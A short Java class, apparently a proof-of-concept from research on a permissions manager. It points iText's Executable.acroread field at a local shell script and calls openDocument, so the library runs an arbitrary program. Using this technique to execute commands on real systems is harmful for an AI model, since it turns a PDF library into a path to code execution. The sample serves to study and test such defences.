package com.anonuser;

import com.lowagie.tools.Executable;

import java.io.IOException;

public class Itext_no_cve {

    public static void main(String[] args) {

        Executable.acroread = "/home/pamusuo/research/permissions-manager/exploit-apps/files/create_file.sh";
        try {
            Executable.openDocument("\"",false);
        } catch (IOException e) {
            System.out.println("Exception thrown: " + e.getMessage());
        }
    }
}
